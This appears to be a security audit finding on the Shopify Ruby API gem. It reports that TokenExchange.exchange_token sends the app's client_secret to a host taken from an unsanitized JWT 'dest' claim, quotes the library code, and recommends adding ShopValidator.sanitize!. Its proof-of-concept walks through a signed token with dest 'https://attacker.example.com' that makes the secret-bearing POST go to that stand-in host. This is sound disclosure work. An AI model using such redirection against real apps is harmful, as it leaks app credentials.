Confirmed vulnerability: `TokenExchange.exchange_token` sends the app's `client_secret` to a host derived from an unsanitized JWT `dest` claim, while the sibling flows (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) all pass their `shop` value through `Utils::ShopValidator.sanitize!` before using it to build the destination host.

### Title
`client_secret` sent to unsanitized host derived from JWT `dest` claim in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the request host that receives the app's `client_id`/`client_secret` from `jwt_payload.shop` (the JWT `dest` claim), without ever routing it through `ShopifyAPI::Utils::ShopValidator.sanitize!`. Every other credential-exchange flow in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly sanitizes the `shop` value with `ShopValidator.sanitize!` before using it as the destination host for the same secret-bearing POST request.

### Finding Description
The identity binding that should hold is: **host that is cryptographically bound as the token's destination == host that actually receives the `client_secret`**, and that host must be a domain matching `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

In `token_exchange.rb`:
```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
...
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
``` [1](#0-0) 

`JwtPayload#shop` simply strips `"https://"` from the raw `dest` claim with no format/domain restriction:
```ruby
def shop
  @dest.gsub("https://", "")
end
``` [2](#0-1) 

`JwtPayload.new` only checks the JWT signature (`HS256` against `api_secret_key`), expiry/`nbf`, and that `aud == Context.api_key`; it never validates that `dest` is a trusted Shopify domain: [3](#0-2) 

`HttpClient` then builds the request URI directly from `session.shop`:
```ruby
@base_uri = T.let("https://#{api_host || session.shop}", String)
``` [4](#0-3) 

and the POST body sent to that URI includes `client_secret: ShopifyAPI::Context.api_secret_key`, `client_id`, and `subject_token: session_token`: [5](#0-4) 

Compare this to the sibling flows, which all call `Utils::ShopValidator.sanitize!(shop)` (raising `Errors::InvalidShopError` if the domain isn't in `TRUSTED_SHOPIFY_DOMAINS`) before constructing the same secret-bearing session/host: [6](#0-5) [7](#0-6) [8](#0-7) 

`exchange_token` is the one exception: it trusts the raw `dest` string as a hostname with no domain allow-listing, no scheme/path stripping validation, and no protection against a `dest` value containing a path, port, or userinfo component that could redirect the client_secret-bearing POST to an attacker-influenced host if `dest` ever deviates from a bare `shop.myshopify.com` value.

### Impact Explanation
If `dest` can be made to contain anything other than a bare trusted Shopify hostname (e.g., due to any weakness in how the session token is issued, proxied, or handled upstream, or future changes to token issuance formats), `exchange_token` would send the app's `client_id` and `client_secret` — high-value, non-rotatable app credentials — to a host chosen from unvalidated claim content, unlike every comparable code path in this library. This is a High-severity credential-leakage/SSRF-with-credentials class of issue per the stated impact taxonomy, and represents a clear asymmetry/regression relative to the gem's own `ShopValidator` hardening applied everywhere else.

### Likelihood Explanation
Exploitation likelihood is constrained by the fact that `session_token` must carry a valid HS256 signature over `Context.api_secret_key`, which an unprivileged internet user cannot forge without already possessing the app's secret. However, the missing validation is a real gap in defense-in-depth: it means the security property "app secrets are only ever sent to `ShopValidator`-approved hosts" is not uniformly enforced by this gem, and the safety of `exchange_token` today rests entirely on trusting the `dest` claim's literal string value with no allow-list check — a materially weaker guarantee than the rest of the credential-exchange surface provides.

### Recommendation
In `lib/shopify_api/auth/token_exchange.rb`, route `dest_shop` through `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `client_credentials.rb`, `refresh_token.rb`, and `migrate_to_expiring_token`) before constructing `shop_session`, so the host that receives `client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Obtain (or in a hypothetical weakened-issuance scenario, otherwise cause the app to receive) a validly HS256-signed session token whose `dest` claim is `"https://attacker.example.com"` instead of a `*.myshopify.com` host.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new` validates only the signature, `aud`, `exp`/`nbf` — it accepts `dest: "https://attacker.example.com"` unconditionally: [9](#0-8) 
4. `dest_shop` becomes `"attacker.example.com"`, and `HttpClient` issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret`: [4](#0-3) 
5. No `ShopValidator.sanitize!` call exists anywhere in `exchange_token` to prevent this, unlike `client_credentials`, `refresh_token`, and `migrate_to_expiring_token`.

### Citations

**File:** lib/shopify_api/auth/token_exchange.rb (L40-65)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L23-51)
```ruby
      sig { params(token: String).void }
      def initialize(token)
        payload_hash = begin
          decode_token(token, Context.api_secret_key)
        rescue ShopifyAPI::Errors::InvalidJwtTokenError
          raise unless Context.old_api_secret_key

          decode_token(token, T.must(Context.old_api_secret_key))
        end

        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))

        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end

      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```
